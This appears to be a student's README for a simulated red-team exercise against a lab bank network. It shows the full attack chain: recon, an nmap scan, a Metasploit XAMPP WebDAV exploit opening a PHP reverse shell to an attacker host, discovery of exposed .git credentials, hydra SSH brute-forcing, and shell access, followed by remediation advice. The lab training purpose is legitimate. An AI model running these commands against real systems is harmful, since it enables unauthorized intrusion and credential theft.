# 🛡️ Red Teaming Operations Project

A beginner-friendly, full-scope red teaming simulation conducted against PJ Bank's virtual infrastructure. This project involves reconnaissance, vulnerability scanning, exploitation of both Windows and Linux machines, and professional reporting.


## 📌 Project Overview

This simulation mimics a real-world penetration test and follows standard red team methodology. The infrastructure includes:

| Asset                        | Hostname                  | IP Address   |
|-----------------------------|---------------------------|--------------|
| Public web server           | Learnaboutsecurity.com    | [REDACTED]   |
| Employee workstation        | Win10                     | 10.1.2.4     |
| Web server in DMZ           | DMZiServer                | 10.1.0.7     |
| Payroll server (internal)   | Debianx64DMZOnCloudNew    | 10.1.0.12    |


## 🔍 Phase 1: Reconnaissance

### ✅ WHOIS Lookup
- Used [whois.com](https://whois.com) to gather registration info on `learnaboutsecurity.com`

### ✅ DNS Enumeration
- Used [dnsdumpster.com](https://dnsdumpster.com) to discover DNS records and host IPs

### ✅ Technology Fingerprinting
- Identified technologies like Cloudflare, Font Awesome, and HSTS using [Wappalyzer](https://www.wappalyzer.com)


## 🖥️ Phase 2: Windows Exploitation

### 🔎 Scanning
nmap -sV -p- -T4 -Pn 10.1.2.4
Discovered Apache 2.2.14 (outdated)

#### 💥 Exploitation (Metasploit)
bash
Copy
Edit
use exploit/windows/http/xampp_webdav_upload_php
set payload php/reverse_php
set RHOST 10.1.2.4
set LHOST 10.1.2.5
set LPORT 4444
run
Gained shell access to Windows 10 machine

## 🧱 Phase 3: Linux Exploitation
🖥️ Target 1: DMZiServer
🔍 Directory Scan

dirb http://10.1.0.7/ ~/Downloads/Udacity.txt
Found .git/ directory and extracted keys.txt containing:


username: admin123
password: Password123!
🔐 Target 2: Debian Internal Server
🔓 Brute-Forcing SSH

hydra -l admin123 -P ~/Downloads/Udacity.txt ssh://10.1.0.12
Successfully cracked credentials

##### 🧠 SSH Access

ssh admin123@10.1.0.12
whoami
hostname
Gained full shell access

## 📝 Final Report Summary
🔒 Key Vulnerabilities
Severity	Issue
High	Public .git/ with exposed credentials
High	SSH access via weak credentials
Medium	Apache 2.2.14 outdated and exploitable
Low	Misconfigured /server-status endpoint

### 🔧 Recommendations
Block access to developer folders like .git/

Enforce strong password and MFA policies

Regularly patch public-facing software

####🧰 Tools Used
Kali Linux

whois, dnsdumpster, wappalyzer

nmap, dirb, hydra, msfconsole

##### 📸 Screenshots
All evidence and screenshots are saved in the /screenshots directory and referenced in the final report.


##### 🚀 Author
Jamilu Ibrahim Richifa
LinkedIn | GitHub
